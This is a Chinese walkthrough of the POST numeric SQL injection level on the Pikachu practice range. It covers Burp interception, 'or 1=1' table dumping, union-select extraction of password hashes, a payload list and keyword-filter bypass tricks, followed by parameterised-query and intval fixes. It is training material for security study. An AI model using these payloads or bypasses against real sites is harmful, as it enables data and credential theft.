# 数字型注入(post) 通关笔记
> 最简单的注入类型：**参数是数字，不用闭合引号，直接 `or 1=1`。**
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → 数字型注入(post) |
| 页面地址 | `http://pikachu/vul/sqli/sqli_id.php` |
| 提交方式 | **POST** |
| 参数名 | `id` |
| 目标 | 让页面返回超出预期范围的数据 |
页面是一个下拉框，可以选 1~6，点"查询"。
---
## 二、我的解题步骤
### 步骤 1：先正常查一次
选 `1`，点查询：
```
hello,vince
your email is: vince@pikachu.com
```
页面上是 `<select>` 下拉框，只有 1~6 固定选项，**看起来没法输入别的东西**。
### 步骤 2：抓包，改成任意值
下拉框限制了前端能选什么，但请求是我们自己发的。
用 Burp 拦下请求，把：
```
id=1
```
改成：
```
id=1 or 1=1
```
放行。
### 步骤 3：结果
**返回了 7 条记录**——整张 `member` 表被拖出来了。
我实测的对比：
| 输入 | 返回 |
| --- | --- |
| `id=1` | **1 条** |
| `id=1 or 1=1` | **7 条**（vince、allen、kobe、grady、kevin、lucy、lili） |
### 步骤 4：继续读别的表
既然能改 SQL，就能用 `union` 读别的表。
先确定列数：
```
id=1 order by 2
```
正常（说明有 2 列），`order by 3` 报错 → 确认是 **2 列**。
再读 `users` 表（里面有管理员密码）：
```
id=0 union select username,password from users
```
页面把 `users` 表的用户名和密码哈希都显示出来了。
---
## 三、原理分析
### 3.1 源码
```php
if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }
}
```
注意作者自己写的注释：
> 这里没有做任何处理，直接拼到 select 里面去了,形成 Sql 注入
### 3.2 为什么叫"数字型"
因为参数在 SQL 里**没有被引号包裹**：
```sql
select username,email from member where id=$id
                                        ↑ 直接是数字
```
代入 `1 or 1=1`：
```sql
select username,email from member where id=1 or 1=1
```
- `id=1` → 匹配 1 条
- `or 1=1` → 恒真 → 整张表
**不需要闭合任何引号**，直接拼逻辑就行。
### 3.3 如果是字符型会怎样
假如代码是：
```php
$query="select username,email from member where id='$id'";
```
代入 `1 or 1=1`：
```sql
select ... where id='1 or 1=1'
```
**整个 `1 or 1=1` 被当成了一个字符串**，匹配不到任何东西。
这时候就必须先闭合引号：
```
1' or 1=1#
```
```sql
select ... where id='1' or 1=1#'
```
`#` 把后面多余的 `'` 注释掉了。
**这就是"数字型"和"字符型"的区别。**
---
## 四、知识点与笔记
### 4.1 数字型注入的判断方法
| 输入 | 结果 | 说明 |
| --- | --- | --- |
| `1` | 正常 | 基准 |
| `1'` | **报错** | 参数没有引号包裹，多一个 `'` 就语法错误 |
| `1 and 1=1` | 正常 | 逻辑生效 |
| `1 and 1=2` | **没结果** | 确认注入 |
**关键特征：输入 `'` 会报错。** 因为 SQL 里本来没有引号，你多写一个就破坏语法了。
### 4.2 常见 payload
```sql
-- 判断能否注入
1 and 1=1
1 and 1=2
-- 爆出所有数据
1 or 1=1
-- 判断列数
1 order by 2
1 order by 3      -- 报错说明只有 2 列
-- 联合查询
-1 union select 1,2
-1 union select username,password from users
-- 爆数据库名
-1 union select 1,database()
```
### 4.3 为什么要用 `-1` 或 `0`
```sql
-1 union select 1,2
```
前面的 `-1` 查不到数据，页面就只会显示 `union` 后面的结果——**干净、好看。**
如果写 `1 union select ...`，页面会同时显示 `id=1` 那条记录和你的注入结果，容易混。
### 4.4 为什么 `order by` 能猜列数
```sql
select username,email from member order by 2   -- 正常
select username,email from member order by 3   -- 报错：Unknown column '3'
```
`order by N` 是按第 N 列排序。**N 超过实际列数就报错。**
这是最稳的猜列数方法。
### 4.5 下拉框限制不了攻击者
页面只有 1~6 的选项，但：
- 抓包可以改
- 用 Burp Repeater 直接发
- 用 curl / 脚本直接构造
**前端控件只是"方便输入"，不是"安全检查"。**
---
## 五、和字符型的区别
| | 数字型 | 字符型 |
| --- | --- | --- |
| SQL 里的形式 | `where id=$id` | `where name='$name'` |
| 要不要闭合引号 | 不用 | **要** |
| `1'` 会怎样 | **报错** | 可能正常（如果闭合成功） |
| 典型 payload | `1 or 1=1` | `1' or 1=1#` |
**先判断类型，再决定 payload——这是 SQL 注入的第一步。**
---
## 六、防御怎么写
### 6.1 参数化（根本解法）
```php
$stmt = $link->prepare("select username,email from member where id=?");
$stmt->bind_param('i', $id);   // 'i' 表示整型
$stmt->execute();
```
`bind_param('i', ...)` 之后，`$id` 只可能是整数，`or 1=1` 会被当成非法值。
### 6.2 类型转换
```php
$id = intval($_POST['id']);
$query = "select username,email from member where id=$id";
```
`intval` 之后只剩数字，注入不了。
**但这是"补丁"，不是"根治"。** 只要有一处忘了转，就又开了口子。
### 6.3 为什么不推荐"过滤关键字"
```php
$id = str_replace(['or', 'and', 'union'], '', $id);
```
这种写法问题很多：
- 大小写：`OR`、`Union`
- 双写：`oorr` → 删掉中间的 `or` 又变回 `or`
- 注释：`/*!or*/`
- 编码：`%6f%72`
**黑名单的思路本身就不成立。**
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 最简单的注入：数字型 |
| 判断方法 | 输入 `'` 报错 |
| payload | `1 or 1=1` |
| 实测 | `id=1` → 1 条；`id=1 or 1=1` → 7 条 |
| 修复 | 参数化 / `intval` |
**一句话**：
> **数字型是"最不用动脑子"的注入——参数外层没有引号，直接往里拼逻辑就行。**
---
## 参考
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PHP: mysqli::prepare](https://www.php.net/manual/zh/mysqli.prepare.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
